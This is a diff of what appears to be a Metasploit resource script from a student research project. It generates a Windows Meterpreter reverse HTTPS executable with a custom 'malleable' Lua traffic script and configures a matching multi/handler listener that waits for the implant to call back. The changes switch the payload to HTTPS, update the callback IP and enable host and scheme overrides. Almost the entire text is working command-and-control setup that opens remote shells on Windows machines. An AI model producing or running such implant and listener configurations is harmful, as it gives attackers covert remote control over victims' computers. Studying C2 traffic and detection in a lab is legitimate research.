@@ -2,9 +2,9 @@
 setg LogLevel 3
 
 ## PAYLOAD
-use payload/windows/x64/meterpreter_reverse_http
+use payload/windows/x64/meterpreter_reverse_https
 
-set LHOST 192.168.42.201
+set LHOST 192.168.42.131
 set LPORT 443
 #set LPORT 80
 
@@ -15,6 +15,7 @@ set OverrideScheme httpm
 # set HandlerSSLCert "/home/timo/Projects/bachelor/certs/malleable_cert.pem"
 
 set malleablescriptpath /home/timo/Projects/bachelor/lua-testing/unit-tests/luaunit/timoTests/scripts/meterpreter_malleable.lua
+# set malleablescriptpath /home/timo/Projects/bachelor/lua-testing/unit-tests/luaunit/timoTests/scripts/meterpreter_doNothing.lua
 
 generate -f exe -o /mnt/hgfs/Shared_Folder/bachelor/meterpreter_out/meterpreter.exe
 
@@ -22,7 +23,7 @@ generate -f exe -o /mnt/hgfs/Shared_Folder/bachelor/meterpreter_out/meterpreter.
 use multi/handler
 set payload windows/x64/meterpreter_reverse_http
 
-set LHOST 192.168.42.201
+set LHOST 192.168.42.131
 set LPORT 443
 
 
@@ -30,8 +31,8 @@ set reverseAllowProxy false
 set ReverseListenerBindAddress 192.168.42.201
 set ReverseListenerBindPort 5555
 
-#set OverrideRequestHost true
-#set OverrideScheme https
+set OverrideRequestHost true
+set OverrideScheme https
 
 set ExitOnSession false
 
